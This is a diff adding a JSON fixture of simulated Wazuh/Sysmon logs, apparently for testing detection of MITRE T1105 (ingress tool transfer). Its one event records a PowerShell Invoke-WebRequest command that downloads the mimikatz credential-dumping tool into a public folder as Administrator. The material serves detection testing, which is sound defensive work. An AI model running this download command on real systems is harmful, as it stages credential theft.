@@ -1,0 +1,70 @@
+{
+  "_metadata": {
+    "attack_id": "T1105",
+    "variation": "001",
+    "name": "Ingress Tool Transfer via PowerShell Invoke-WebRequest",
+    "description": "Download external tool using PowerShell Invoke-WebRequest cmdlet",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "command-and-control",
+    "format": "wazuh-native",
+    "format_version": "1.0",
+    "campaign": "Campaign 22",
+    "date_executed": "2026-02-09"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - Process Creation: PowerShell Invoke-WebRequest",
+      "sequence": 1,
+      "timestamp": "2026-02-09T10:12:00.000Z",
+      "log": {
+        "timestamp": "",
+        "rule": {
+          "level": 3,
+          "description": "Sysmon - Event 1: Process creation",
+          "id": "200151",
+          "mitre": {
+            "id": ["T1105"],
+            "tactic": ["Command and Control"],
+            "technique": ["Ingress Tool Transfer"]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "014", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "id": "1709000007.000001",
+        "decoder": {"name": "windows_eventchannel"},
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.yourcompany.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-09 10:12:00.000",
+              "processGuid": "{12345678-1234-1234-1234-000000007001}",
+              "processId": "8512",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\mimikatz.zip'\"",
+              "currentDirectory": "C:\\Windows\\System32\\",
+              "user": "YOURCOMPANY\\Administrator",
+              "integrityLevel": "High",
+              "hashes": "SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53",
+              "parentProcessGuid": "{12345678-1234-1234-1234-000000007000}",
+              "parentProcessId": "1234",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "C:\\Windows\\System32\\cmd.exe"
+            }
+          }
+        }
+      }
+    }
+  ]
+}
